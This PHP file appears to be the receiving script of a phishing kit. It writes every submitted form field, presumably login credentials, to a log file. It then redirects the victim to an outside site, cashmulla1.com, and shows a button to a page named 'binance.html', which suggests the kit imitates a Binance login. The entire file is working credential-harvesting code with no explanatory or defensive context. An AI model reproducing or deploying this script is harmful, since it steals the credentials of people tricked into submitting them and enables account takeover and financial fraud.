<?php
header ('Location: https://www.cashmulla1.com/user/');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
echo "<input type='button' value='redirect' onClick=\"location.href='binance.html'\">";
exit;
?>